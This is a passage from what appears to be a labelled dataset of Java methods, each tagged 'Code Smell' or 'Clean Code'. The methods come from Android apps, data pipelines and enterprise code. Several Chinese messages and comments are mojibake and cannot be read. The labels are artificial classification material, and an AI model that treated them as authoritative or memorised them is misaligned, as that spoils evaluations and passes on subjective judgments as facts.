      tMsgCounterL+=Long.parseLong(event.getHeaders().get(MSG_COUNTER_KEY));
    }
 else {
      tMsgCounterL+=1;
    }
    List<Channel> reqChannels=selector.getRequiredChannels(event);
    for (    Channel ch : reqChannels) {
      List<Event> eventQueue=reqChannelQueue.computeIfAbsent(ch,k -> new ArrayList<Event>());
      eventQueue.add(event);
    }
    List<Channel> optChannels=selector.getOptionalChannels(event);
    for (    Channel ch : optChannels) {
      List<Event> eventQueue=optChannelQueue.computeIfAbsent(ch,k -> new ArrayList<Event>());
      eventQueue.add(event);
    }
  }
  boolean success=true;
  for (  Map.Entry<Channel,List<Event>> entry : reqChannelQueue.entrySet()) {
    Channel reqChannel=entry.getKey();
    Transaction tx=reqChannel.getTransaction();
    Preconditions.checkNotNull(tx,""Transaction object must not be null"");
    try {
      tx.begin();
      List<Event> batch=entry.getValue();
      for (      Event event : batch) {
        reqChannel.put(event);
      }
      tx.commit();
    }
 catch (    Throwable t) {
      success=false;
      tx.rollback();
      if (!(t instanceof ChannelException)) {
        LOG.error(""Unable to put batch on required "" + ""channel: "" + reqChannel,t);
        if (t instanceof Error) {
          throw (Error)t;
        }
      }
      break;
    }
 finally {
      tx.close();
    }
  }
  if (!success) {
    for (    Map.Entry<Channel,List<Event>> entry : optChannelQueue.entrySet()) {
      Channel optChannel=entry.getKey();
      Transaction tx=optChannel.getTransaction();
      Preconditions.checkNotNull(tx,""Transaction object must not be null"");
      try {
        tx.begin();
        List<Event> batch=entry.getValue();
        for (        Event event : batch) {
          optChannel.put(event);
        }
        tx.commit();
      }
 catch (      Throwable t) {
        tx.rollback();
        if (t instanceof Error) {
          LOG.error(""Error while writing to optChannel channel: "" + optChannel,t);
          throw (Error)t;
        }
 else {
          throw new ChannelException(""Unable to put batch on optChannel "" + ""channel: "" + optChannel,t);
        }
      }
 finally {
        tx.close();
      }
    }
  }
}",1,Code Smell
"@SuppressLint(""WrongConstant"") public static void lockOrientation(Activity activity){
  if (activity == null || prevOrientation != -10) {
    return;
  }
  try {
    prevOrientation=activity.getRequestedOrientation();
    WindowManager manager=(WindowManager)activity.getSystemService(Activity.WINDOW_SERVICE);
    if (manager != null && manager.getDefaultDisplay() != null) {
      int rotation=manager.getDefaultDisplay().getRotation();
      int orientation=activity.getResources().getConfiguration().orientation;
      if (rotation == Surface.ROTATION_270) {
        if (orientation == Configuration.ORIENTATION_PORTRAIT) {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
        }
 else {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE);
        }
      }
 else       if (rotation == Surface.ROTATION_90) {
        if (orientation == Configuration.ORIENTATION_PORTRAIT) {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_PORTRAIT);
        }
 else {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        }
      }
 else       if (rotation == Surface.ROTATION_0) {
        if (orientation == Configuration.ORIENTATION_LANDSCAPE) {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        }
 else {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
        }
      }
 else {
        if (orientation == Configuration.ORIENTATION_LANDSCAPE) {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE);
        }
 else {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_PORTRAIT);
        }
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}",1,Code Smell
"public void recordVideo(final CameraSession session,final File path,boolean mirror,final VideoTakeCallback callback,final Runnable onVideoStartRecord,CameraView cameraView){
  if (session == null) {
    return;
  }
  final CameraInfo info=session.cameraInfo;
  final Camera camera=info.camera;
  if (cameraView != null) {
    recordingCurrentCameraView=cameraView;
    onVideoTakeCallback=callback;
    recordedFile=path.getAbsolutePath();
    threadPool.execute(() -> {
      try {
        if (camera != null) {
          try {
            Camera.Parameters params=camera.getParameters();
            params.setFlashMode(session.getCurrentFlashMode().equals(Camera.Parameters.FLASH_MODE_ON) ? Camera.Parameters.FLASH_MODE_TORCH : Camera.Parameters.FLASH_MODE_OFF);
            camera.setParameters(params);
            session.onStartRecord();
          }
 catch (          Exception e) {
            FileLog.e(e);
          }
          AndroidUtilities.runOnUIThread(() -> {
            cameraView.startRecording(path,this::finishRecordingVideo);
            if (onVideoStartRecord != null) {
              onVideoStartRecord.run();
            }
          }
);
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
);
    return;
  }
  threadPool.execute(() -> {
    try {
      if (camera != null) {
        try {
          Camera.Parameters params=camera.getParameters();
          params.setFlashMode(session.getCurrentFlashMode().equals(Camera.Parameters.FLASH_MODE_ON) ? Camera.Parameters.FLASH_MODE_TORCH : Camera.Parameters.FLASH_MODE_OFF);
          camera.setParameters(params);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        camera.unlock();
        try {
          mirrorRecorderVideo=mirror;
          recorder=new MediaRecorder();
          recorder.setCamera(camera);
          recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
          recorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
          session.configureRecorder(1,recorder);
          recorder.setOutputFile(path.getAbsolutePath());
          recorder.setMaxFileSize(1024 * 1024 * 1024);
          recorder.setVideoFrameRate(30);
          recorder.setMaxDuration(0);
          Size pictureSize;
          pictureSize=new Size(16,9);
          pictureSize=CameraController.chooseOptimalSize(info.getPictureSizes(),720,480,pictureSize);
          int bitrate;
          if (Math.min(pictureSize.mHeight,pictureSize.mWidth) >= 720) {
            bitrate=3500000;
          }
 else {
            bitrate=1800000;
          }
          recorder.setVideoEncodingBitRate(bitrate);
          recorder.setVideoSize(pictureSize.getWidth(),pictureSize.getHeight());
          recorder.setOnInfoListener(CameraController.this);
          recorder.prepare();
          recorder.start();
          onVideoTakeCallback=callback;
          recordedFile=path.getAbsolutePath();
          if (onVideoStartRecord != null) {
            AndroidUtilities.runOnUIThread(onVideoStartRecord);
          }
        }
 catch (        Exception e) {
          recorder.release();
          recorder=null;
          FileLog.e(e);
        }
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
);
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.multilabel.protos.IndependentMultiLabelModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.multilabel.protos.IndependentMultiLabelModelProto other=(org.tribuo.multilabel.protos.IndependentMultiLabelModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getModelsList().equals(other.getModelsList()))   return false;
  if (!getLabelsList().equals(other.getLabelsList()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",1,Code Smell
"@SuppressWarnings(""rawtypes"") @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (Helper.prefs.getBoolean(""switch_mainswitch"",false)) {
    Object result=param.getResult();
    if (result == null)     return;
    Class<?> resultClass=result.getClass();
    if (result != null) {
      if (resultClass == ApiTemplateRoot) {
        String type=(String)Helper.DataUnique_type.get(ApiTemplateRoot_extra.get(result));
        if (Helper.prefs.getBoolean(""switch_video"",false) && (type.equals(""zvideo"") || type.equals(""drama""))) {
          param.setResult(null);
          return;
        }
        if (Helper.prefs.getBoolean(""switch_removearticle"",false) && (""article"".equals(type) || ""Post"".equals(type))) {
          param.setResult(null);
          return;
        }
        if (Helper.prefs.getBoolean(""switch_pin"",false) && ""pin"".equals(type)) {
          param.setResult(null);
          return;
        }
        if (Helper.prefs.getBoolean(""switch_feedad"",true) && ""SvipActivity"".equals(type)) {
          param.setResult(null);
          return;
        }
        Object feed_content=ApiFeedCard_feed_content.get(ApiTemplateRoot_common_card.get(result));
        if (feed_content == null)         return;
        Object video=ApiFeedContent_video.get(feed_content);
        if (Helper.prefs.getBoolean(""switch_video"",false) && video != null) {
          param.setResult(null);
        }
 else {
          if (Helper.regex_title == null && Helper.regex_author == null && Helper.regex_content == null)           return;
          if (Helper.regex_title != null) {
            String title=(String)ApiText_panel_text.get(ApiFeedContent_title.get(feed_content));
            if (Helper.regex_title.matcher(title).find()) {
              param.setResult(null);
            }
          }
          if (Helper.regex_author != null) {
            Object sourceLine=ApiFeedContent_sourceLine.get(feed_content);
            List elements=(List)ApiLine_elements.get(sourceLine);
            String author=(String)ApiText_panel_text.get(ApiElement_text.get(elements.get(1)));
            if (Helper.regex_author.matcher(author).find()) {
              param.setResult(null);
            }
          }
          if (Helper.regex_content != null) {
            String content=(String)ApiText_panel_text.get(ApiFeedContent_content.get(feed_content));
            if (Helper.regex_content.matcher(content).find()) {
              param.setResult(null);
            }
          }
        }
      }
 else       if (resultClass == MarketCard) {
        if (Helper.prefs.getBoolean(""switch_marketcard"",false)) {
          param.setResult(null);
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * decode
 * @param srcBytes
 * @param extParams
 * @return
 */
@Override public SourceData decode(byte[] srcBytes,Map<String,Object> extParams){
  String srcString=new String(srcBytes,srcCharset);
  return this.decode(srcString,extParams);
}
/** 
 * decode
 * @param srcString
 * @param extParams
 * @return
 */
@Override public SourceData decode(String srcString,Map<String,Object> extParams){
  JsonObject root=gson.fromJson(srcString,JsonObject.class);
  JsonArray childRoot=null;
  if (this.childNodes != null && this.childNodes.size() > 0) {
    JsonElement current=root;
    for (    JsonNode node : childNodes) {
      if (!current.isJsonObject()) {
        return new JsonSourceData(root,childRoot);
      }
      JsonElement newElement=current.getAsJsonObject().get(node.getName());
      if (newElement == null) {
        return new JsonSourceData(root,childRoot);
      }
      if (!node.isArray()) {
        current=newElement;
      }
 else {
        if (!newElement.isJsonArray()) {
          return new JsonSourceData(root,childRoot);
        }
        JsonArray newArray=newElement.getAsJsonArray();
        if (node.getArrayIndex() >= newArray.size()) {
          return new JsonSourceData(root,childRoot);
        }
        current=newArray.get(node.getArrayIndex());
      }
    }
    if (!current.isJsonArray()) {
      return new JsonSourceData(root,childRoot);
    }
    childRoot=current.getAsJsonArray();
  }
  SourceData sourceData=new JsonSourceData(root,childRoot);
  return sourceData;
}",1,Code Smell
"boolean deleteByClusterId(Long id){
  boolean flag=false;
  String sql=Constants.Symbol.PERCENT + id + Constants.Symbol.PERCENT;
  List<TaskInfo> tasks=taskInfoMapper.selectByClusterId(sql);
  if (tasks.isEmpty()) {
    return true;
  }
  List<Long> ids=new ArrayList<>();
  List<TaskInfo> updates=new ArrayList<>();
  tasks.forEach(task -> {
    String[] clusterIds=task.getClusterIds().split(Constants.Symbol.COMMA);
    if (clusterIds.length == 1) {
      ids.add(task.getId());
    }
 else {
      List<String> clusterIdList=Arrays.asList(clusterIds);
      List<String> clusterIdArrayList=new ArrayList<>(clusterIdList);
      clusterIdArrayList.remove(id.toString());
      Object[] arr=clusterIdArrayList.toArray();
      task.setClusterIds(Arrays.toString(arr).replaceAll(Constants.Symbol.DOUBLE_THE_SLASH + Constants.Symbol.LEFT_PARENTHESES,Constants.Symbol.EMPTY_STR).replaceAll(Constants.Symbol.DOUBLE_THE_SLASH + Constants.Symbol.RIGHT_PARENTHESES,Constants.Symbol.EMPTY_STR));
      updates.add(task);
    }
  }
);
  int delete=0;
  boolean xxx=true;
  if (!ids.isEmpty()) {
    delete=taskInfoMapper.deleteBatchIds(ids);
  }
  if (!updates.isEmpty()) {
    for (    TaskInfo update : updates) {
      if (taskInfoMapper.updateById(update) > 0) {
      }
 else {
        xxx=false;
      }
    }
  }
  if (delete > 0 && xxx) {
    flag=true;
  }
  return flag;
}",1,Code Smell
"private void checkProcessSaveParam(AppraisalPlanProcessSettingBO appraisalPlanProcessSettingBO){
  if ((ObjectUtil.isNull(appraisalPlanProcessSettingBO.getResultAudit())) || (!appraisalPlanProcessSettingBO.getResultAudit())) {
    appraisalPlanProcessSettingBO.setProcessSettingResultAuditBOList(null);
  }
  if ((ObjectUtil.isNull(appraisalPlanProcessSettingBO.getResultConfirmation())) || (!appraisalPlanProcessSettingBO.getResultConfirmation())) {
    appraisalPlanProcessSettingBO.setProcessSettingResultConfirmationBOList(null);
  }
  List<ProcessSettingScoringBO> processSettingScoringBOList=appraisalPlanProcessSettingBO.getProcessSettingScoringBOList();
  if (CollectionUtil.isEmpty(processSettingScoringBOList)) {
    throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""璇勫垎浜哄垪琛ㄤ笉鑳戒负绌�"");
  }
  processSettingScoringBOList.forEach(processSettingScoring -> {
    if (ObjectUtil.isNull(processSettingScoring.getRaterType())) {
      throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""璇勫垎浜虹被鍨嬩笉鑳戒负绌�"");
    }
    if (processSettingScoring.getRaterType().equals(RaterTypeEnum.SELF)) {
      if (ObjectUtil.isNotNull(processSettingScoring.getRejectAuthority())) {
        throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""琚�冩牳浜轰笉鑳借缃┏鍥炴潈闄�"");
      }
    }
 else {
      if (ObjectUtil.isNull(processSettingScoring.getRejectAuthority())) {
        processSettingScoring.setRejectAuthority(false);
      }
    }
  }
);
}
",1,Code Smell
"/** 
 * The l1 or Manhattan distance between this vector and the other vector.
 * @param other The other vector.
 * @return The l1 distance.
 */
@Override public double l1Distance(SGDVector other){
  if (other.size() != elements.length) {
    throw new IllegalArgumentException(""Can't measure distance of two vectors of different lengths, this = "" + elements.length + "", other = ""+ other.size());
  }
 else   if (other instanceof DenseVector) {
    double score=0.0;
    for (int i=0; i < elements.length; i++) {
      score+=Math.abs(get(i) - other.get(i));
    }
    return score;
  }
 else   if (other instanceof SparseVector) {
    double score=0.0;
    int i=0;
    Iterator<VectorTuple> otherItr=other.iterator();
    VectorTuple otherTuple;
    while (i < elements.length && otherItr.hasNext()) {
      otherTuple=otherItr.next();
      while (i < elements.length && (i < otherTuple.index)) {
        score+=Math.abs(get(i));
        i++;
      }
      if (i == otherTuple.index) {
        score+=Math.abs(get(i) - otherTuple.value);
        i++;
      }
    }
    for (; i < elements.length; i++) {
      score+=Math.abs(get(i));
    }
    return score;
  }
 else {
    throw new IllegalArgumentException(""Unknown vector subclass "" + other.getClass().getCanonicalName() + "" for input"");
  }
}",1,Code Smell
"@Override public void onZoomFinished(MessageObject messageObject){
  if (messageObject == null) {
    return;
  }
  if (MediaController.getInstance().isPlayingMessage(messageObject)) {
    for (int i=0; i < chatListView.getChildCount(); i++) {
      if (chatListView.getChildAt(i) instanceof ChatMessageCell) {
        ChatMessageCell cell=(ChatMessageCell)chatListView.getChildAt(i);
        if (cell.getMessageObject().getId() == messageObject.getId()) {
          AnimatedFileDrawable animation=cell.getPhotoImage().getAnimation();
          if (animation.isRunning()) {
            animation.stop();
          }
          if (animation != null) {
            Bitmap bitmap=animation.getAnimatedBitmap();
            if (bitmap != null) {
              try {
                Bitmap src=pinchToZoomHelper.getVideoBitmap(bitmap.getWidth(),bitmap.getHeight());
                Canvas canvas=new Canvas(bitmap);
                canvas.drawBitmap(src,0,0,null);
                src.recycle();
              }
 catch (              Throwable e) {
                FileLog.e(e);
              }
            }
          }
        }
      }
    }
    createTextureView(true);
    MediaController.getInstance().setTextureView(videoTextureView,aspectRatioFrameLayout,videoPlayerContainer,true);
  }
  chatListView.invalidate();
}",1,Code Smell
"@Override public void onPageRight(){
  int size=mAdapter.size();
  if (size <= 0 || mPages.isEmpty()) {
    return;
  }
  GalleryView galleryView=mGalleryView;
  getBottomState();
  int bottom=mBottomStateBottom;
  boolean hasNext=mBottomStateHasNext;
  if (!hasNext && bottom <= galleryView.getHeight()) {
    mOverScroller.overScroll(GLEdgeView.BOTTOM);
    mGalleryView.onTransferEnd();
  }
 else {
    cancelAllAnimations();
    GalleryPageView lastShownPage=null;
    GalleryPageView nextPage=null;
    for (    GalleryPageView p : mPages) {
      if (isInScreen(p)) {
        lastShownPage=p;
      }
 else       if (null != lastShownPage) {
        nextPage=p;
        break;
      }
    }
    int height=galleryView.getHeight();
    int maxOffset=height - mInterval;
    if (null == lastShownPage) {
      Log.e(TAG,""Can't find last shown page when paging left"");
      mOffsetY-=height / 2;
    }
 else {
      int lastShownBottom=lastShownPage.bounds().bottom;
      if (lastShownBottom <= height) {
        if (null == nextPage) {
          Log.e(TAG,""Can't find previous page when paging left and offsetY == 0"");
          mOffsetY-=height / 2;
        }
 else {
          mOffsetY-=Math.min(maxOffset,nextPage.bounds().bottom - height);
        }
      }
 else {
        mOffsetY-=Math.min(maxOffset,lastShownBottom - height);
      }
    }
    mGalleryView.requestFill();
  }
}",1,Code Smell
"public static FileSystemManager createLocal(){
  return new FileSystemManager(){
    @NonNull @Override public ExtendedFile getFile(    @NonNull String pathname){
      return new LocalFile(pathname);
    }
    @NonNull @Override public ExtendedFile getFile(    @Nullable String parent,    @NonNull String child){
      return new LocalFile(parent,child);
    }
    @SuppressLint(""NewApi"") @NonNull @Override public FileChannel openChannel(    @NonNull File file,    int mode) throws IOException {
      if (Build.VERSION.SDK_INT >= 26) {
        return FileChannel.open(file.toPath(),FileUtils.modeToOptions(mode));
      }
 else {
        FileUtils.Flag f=FileUtils.modeToFlag(mode);
        if (f.write) {
          if (!f.create) {
            if (!file.exists()) {
              ErrnoException e=new ErrnoException(""open"",OsConstants.ENOENT);
              throw new FileNotFoundException(file + "": "" + e.getMessage());
            }
          }
          if (f.append) {
            return new FileOutputStream(file,true).getChannel();
          }
          if (!f.read && f.truncate) {
            return new FileOutputStream(file,false).getChannel();
          }
          FileChannel ch=new RandomAccessFile(file,""rw"").getChannel();
          if (f.truncate) {
            ch.truncate(0);
          }
          return ch;
        }
 else {
          return new FileInputStream(file).getChannel();
        }
      }
    }
  }
;
}",1,Code Smell
"@Nullable @Override public RowData nextRecordFromSplit(){
  if (reader == null) {
    return null;
  }
  while (true) {
    if (curRecordIdx >= currentVCR.getRowCount()) {
      if (this.reader.hasNext()) {
        this.currentVCR=this.reader.nextResultVectorSchemaRoot();
        makeCurrentArrowReader();
        curRecordIdx=0;
      }
 else {
        this.reader.close();
        LOG.info(""Reach end of split file {}"",split);
        return null;
      }
    }
    RowData rd=null;
    RowKind rk=RowKind.INSERT;
    int rowId=0;
    while (curRecordIdx < currentVCR.getRowCount()) {
      rowId=curRecordIdx;
      curRecordIdx++;
      rd=this.curArrowReader.read(rowId);
      if (!cdcColumn.isEmpty()) {
        if (this.isStreaming) {
          rk=FlinkUtil.operationToRowKind((StringData)cdcFieldGetter.getFieldOrNull(rd));
          LOG.debug(""Set RowKind to {}"",rk);
        }
 else {
          if (FlinkUtil.isCDCDelete((StringData)cdcFieldGetter.getFieldOrNull(rd))) {
            rd=null;
            continue;
          }
        }
      }
      break;
    }
    if (rd == null) {
      continue;
    }
    rd=this.curArrowReaderRequestedSchema.read(rowId);
    rd.setRowKind(rk);
    return rd;
  }
}",1,Code Smell
"public Builder withInputImage(String inputImage){
  this.inputImage=inputImage;
  return this;
}
",0,Clean Code
"public static long fmix64(long k){
  k^=k >>> 33;
  k*=0xff51afd7ed558ccdL;
  k^=k >>> 33;
  k*=0xc4ceb9fe1a85ec53L;
  k^=k >>> 33;
  return k;
}",0,Clean Code
"String getPklVersion();
",0,Clean Code
"@Override public void changedVisibility(final IViewEdge<?> edge,final boolean visible){
  if (visible) {
    final Node source=m_sourceNode.getNode();
    final Node target=m_targetNode.getNode();
    if ((source.getGraph() == null) || (target.getGraph() == null)) {
      return;
    }
    final HierarchyManager hm=m_graph.getHierarchyManager();
    final Edge yedge=hm.createEdge(source,target);
    m_graph.setRealizer(yedge,m_realizer);
    m_edge=yedge;
  }
 else   if (m_edge.getGraph() == m_graph) {
    m_graph.removeEdge(m_edge);
  }
}
@Override public void changedVisibility(final ZyEdgeRealizer<EdgeTypeT> realizer){
  m_rawEdge.setVisible(realizer.isVisible());
}
",0,Clean Code
"@POST(""/api/show"") @Headers({""Content-Type: application/json""}) Call<OllamaModelCard> showInformation(@Body ShowModelInformationRequest modelDetailsRequest);
",0,Clean Code
"@Override public ChallengeStoryInfo clone(){
  return new ChallengeStoryInfo().copyFrom(this);
}
",0,Clean Code
"@Override public long getWorkflowCount(String query,String freeText){
  try {
    return getObjectCounts(query,freeText,WORKFLOW_DOC_TYPE);
  }
 catch (  Exception e) {
    throw new TransientException(e.getMessage(),e);
  }
}
",0,Clean Code
"/** 
 * <code>optional uint32 point_id = 12;</code>
 * @return whether the pointId field is set
 */
public boolean hasPointId(){
  return (bitField0_ & 0x00000008) != 0;
}",0,Clean Code
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  CommonApiSearchResult commonApiSearchResult=(CommonApiSearchResult)previousPageResult;
  SearchResult[] results=commonApiSearchResult == null ? new SearchResult[mModpackApis.length] : commonApiSearchResult.searchResults;
  int totalSize=0;
  Future<?>[] futures=new Future<?>[mModpackApis.length];
  for (int i=0; i < mModpackApis.length; i++) {
    if (results[i] != null && results[i].results.length == 0)     continue;
    if (previousPageResult != null && results[i] == null)     continue;
    futures[i]=PojavApplication.sExecutorService.submit(new ApiDownloadTask(i,searchFilters,results[i]));
  }
  if (Thread.interrupted()) {
    cancelAllFutures(futures);
    return null;
  }
  boolean hasSuccessful=false;
  for (int i=0; i < mModpackApis.length; i++) {
    Future<?> future=futures[i];
    if (future == null)     continue;
    try {
      SearchResult searchResult=results[i]=(SearchResult)future.get();
      if (searchResult != null)       hasSuccessful=true;
 else       continue;
      totalSize+=searchResult.totalResultCount;
    }
 catch (    Exception e) {
      cancelAllFutures(futures);
      e.printStackTrace();
      return null;
    }
  }
  if (!hasSuccessful) {
    return null;
  }
  ArrayList<ModItem[]> filteredResults=new ArrayList<>(results.length);
  for (  SearchResult result : results) {
    if (result == null)     continue;
    ModItem[] searchResults=result.results;
    if (searchResults.length == 0)     continue;
    filteredResults.add(searchResults);
  }
  filteredResults.trimToSize();
  if (Thread.interrupted())   return null;
  ModItem[] concatenatedItems=buildFusedResponse(filteredResults);
  if (Thread.interrupted())   return null;
  if (commonApiSearchResult == null)   commonApiSearchResult=new CommonApiSearchResult();
  commonApiSearchResult.searchResults=results;
  commonApiSearchResult.totalResultCount=totalSize;
  commonApiSearchResult.results=concatenatedItems;
  return commonApiSearchResult;
}",0,Clean Code
"private Properties.Comment commentFromLine(String line,String prefix,Properties.Comment.Delimiter delimiter){
  StringBuilder prefixBuilder=new StringBuilder(prefix);
  StringBuilder message=new StringBuilder();
  boolean inComment=false;
  int state=0;
  for (  char c : line.toCharArray()) {
switch (state) {
case 0:
      if (Character.isWhitespace(c)) {
        prefixBuilder.append(c);
        break;
      }
    state++;
case 1:
  if ((c == '#' || c == '!') && !inComment) {
    inComment=true;
    continue;
  }
 else   if (!Character.isWhitespace(c)) {
    message.append(c);
    break;
  }
state++;
case 2:
if (!Character.isWhitespace(c)) {
message.append(c);
state--;
break;
}
 else {
message.append(c);
}
}
}
return new Properties.Comment(randomId(),prefixBuilder.toString(),Markers.EMPTY,delimiter,message.toString());
}",0,Clean Code
"public abstract void onOptionsItemSelected(MenuItem menuItem);
",0,Clean Code
"@Override @TruffleBoundary public void describe(StringBuilder builder,String indent){
  describeSummary(builder,indent);
  describeDetails(builder,indent);
}
",0,Clean Code
"/** 
 * 鑾峰彇鍙傛暟鏁版嵁 渚嬪: getParam(""token=xx;Identifier=xxx;"", ""token""); 杩斿洖: xx
 * @param d         琚煡鎵剧殑鏁版嵁
 * @param paramName 瑕佹煡鎵剧殑瀛楁
 * @return
 */
public static String getParam(final String d,final String paramName){
  if (d == null || d.length() == 0)   return null;
  String value=""test=test;"" + d;
  final int length=value.length();
  int start=value.indexOf(';') + 1;
  if (start == 0 || start == length)   return null;
  int end=value.indexOf(';',start);
  if (end == -1)   end=length;
  while (start < end) {
    int nameEnd=value.indexOf('=',start);
    if (nameEnd != -1 && nameEnd < end && paramName.equals(value.substring(start,nameEnd).trim())) {
      String paramValue=value.substring(nameEnd + 1,end).trim();
      int valueLength=paramValue.length();
      if (valueLength != 0)       if (valueLength > 2 && '""' == paramValue.charAt(0) && '""' == paramValue.charAt(valueLength - 1))       return paramValue.substring(1,valueLength - 1);
 else       return paramValue;
    }
    start=end + 1;
    end=value.indexOf(';',start);
    if (end == -1)     end=length;
  }
  return null;
}",0,Clean Code
"private void loadFromStart(int selectedType){
  int type;
  if (selectedType == 0) {
    type=MEDIA_PHOTOVIDEO;
    if (sharedMediaData[0].filterType == FILTER_PHOTOS_ONLY) {
      type=MediaDataController.MEDIA_PHOTOS_ONLY;
    }
 else     if (sharedMediaData[0].filterType == FILTER_VIDEOS_ONLY) {
      type=MediaDataController.MEDIA_VIDEOS_ONLY;
    }
  }
 else   if (selectedType == 1) {
    type=MediaDataController.MEDIA_FILE;
  }
 else   if (selectedType == 2) {
    type=MediaDataController.MEDIA_AUDIO;
  }
 else   if (selectedType == 4) {
    type=MediaDataController.MEDIA_MUSIC;
  }
 else   if (selectedType == 5) {
    type=MediaDataController.MEDIA_GIF;
  }
 else {
    type=MediaDataController.MEDIA_URL;
  }
  sharedMediaData[selectedType].loading=true;
  profileActivity.getMediaDataController().loadMedia(dialog_id,50,0,sharedMediaData[selectedType].min_id,type,topicId,1,profileActivity.getClassGuid(),sharedMediaData[selectedType].requestIndex);
}",0,Clean Code
"public static LocalDate toLocalDate(Object obj){
  if (obj == null) {
    return null;
  }
  if (obj instanceof LocalDate) {
    return (LocalDate)obj;
  }
  if (obj instanceof LocalDateTime) {
    return ((LocalDateTime)obj).toLocalDate();
  }
  if (obj instanceof java.sql.Date) {
    return ((java.sql.Date)obj).toLocalDate();
  }
  if (obj instanceof java.sql.Time) {
    throw new IllegalArgumentException(""Unable to convert to LocalDate from a java.sql.Time value '"" + obj + ""'"");
  }
  if (obj instanceof java.util.Date) {
    java.util.Date date=(java.util.Date)obj;
    return LocalDate.of(date.getYear() + 1900,date.getMonth() + 1,date.getDate());
  }
  if (obj instanceof Long) {
    return LocalDate.ofEpochDay((Long)obj);
  }
  if (obj instanceof Integer) {
    return LocalDate.ofEpochDay((Integer)obj);
  }
  throw new IllegalArgumentException(""Unable to convert to LocalDate from unexpected value '"" + obj + ""' of type ""+ obj.getClass().getName());
}",0,Clean Code
"/** 
 * 鍒ゆ柇绫诲瀷鏄惁鍏煎
 * @param base
 * @param target
 * @return
 */
private static boolean judgeTypeMatch(Class base,Class target){
  if (base.isAssignableFrom(target)) {
    return true;
  }
  if (base == int.class) {
    return target == Integer.class;
  }
 else   if (base == Integer.class) {
    return target == int.class;
  }
 else   if (base == long.class) {
    return target == Long.class;
  }
 else   if (base == Long.class) {
    return target == long.class;
  }
 else   if (base == float.class) {
    return target == Float.class;
  }
 else   if (base == Float.class) {
    return target == float.class;
  }
 else   if (base == double.class) {
    return target == Double.class;
  }
 else   if (base == Double.class) {
    return target == double.class;
  }
 else   if (base == boolean.class) {
    return target == Boolean.class;
  }
 else   if (base == Boolean.class) {
    return target == boolean.class;
  }
 else   if (base == char.class) {
    return target == Character.class;
  }
 else   if (base == Character.class) {
    return target == char.class;
  }
 else   if (base == byte.class) {
    return target == Byte.class;
  }
 else   if (base == Byte.class) {
    return target == byte.class;
  }
 else   if (base == short.class) {
    return target == Short.class;
  }
 else   if (base == Short.class) {
    return target == short.class;
  }
 else {
    return false;
  }
}
",0,Clean Code
"@Override public void cancel(WorkflowModel workflow,TaskModel task,WorkflowExecutor executor){
  task.setStatus(TaskModel.Status.CANCELED);
}
",0,Clean Code
"protected Object convertTimeValue(Time value,String type) throws Throwable {
  if (DataType.TIME.equals(type) || DataType.UNKNOWN.equals(type))   return value;
  if (value == null)   return null;
  if (DataType.STRING.equals(type))   return this._timeFormat.format(value);
 else   if (DataType.NUMBER.equals(type))   return value.getTime();
 else   if (DataType.INTEGER.equals(type))   return value.getTime();
 else   if (DataType.DECIMAL.equals(type))   return value.getTime();
 else   if (DataType.DATE.equals(type))   return new Date(value.getTime());
 else   if (DataType.TIMESTAMP.equals(type))   return new Timestamp(value.getTime());
 else   throw new DataValueConvertionException(value,type);
}
",0,Clean Code
"public IDanmakuFilter<?> registerFilter(String tag){
  return registerFilter(tag,true);
}
public IDanmakuFilter<?> registerFilter(String tag,boolean primary){
  if (tag == null) {
    throwFilterException();
    return null;
  }
  IDanmakuFilter<?> filter=filters.get(tag);
  if (filter == null) {
    if (TAG_TYPE_DANMAKU_FILTER.equals(tag)) {
      filter=new TypeDanmakuFilter();
    }
 else     if (TAG_QUANTITY_DANMAKU_FILTER.equals(tag)) {
      filter=new QuantityDanmakuFilter();
    }
 else     if (TAG_ELAPSED_TIME_FILTER.equals(tag)) {
      filter=new ElapsedTimeFilter();
    }
 else     if (TAG_TEXT_COLOR_DANMAKU_FILTER.equals(tag)) {
      filter=new TextColorFilter();
    }
 else     if (TAG_USER_ID_FILTER.equals(tag)) {
      filter=new UserIdFilter();
    }
 else     if (TAG_USER_HASH_FILTER.equals(tag)) {
      filter=new UserHashFilter();
    }
 else     if (TAG_GUEST_FILTER.equals(tag)) {
      filter=new GuestFilter();
    }
 else     if (TAG_DUPLICATE_FILTER.equals(tag)) {
      filter=new DuplicateMergingFilter();
    }
 else     if (TAG_MAXIMUN_LINES_FILTER.equals(tag)) {
      filter=new MaximumLinesFilter();
    }
 else     if (TAG_OVERLAPPING_FILTER.equals(tag)) {
      filter=new OverlappingFilter();
    }
  }
  if (filter == null) {
    throwFilterException();
    return null;
  }
  filter.setData(null);
  if (primary) {
    filters.put(tag,filter);
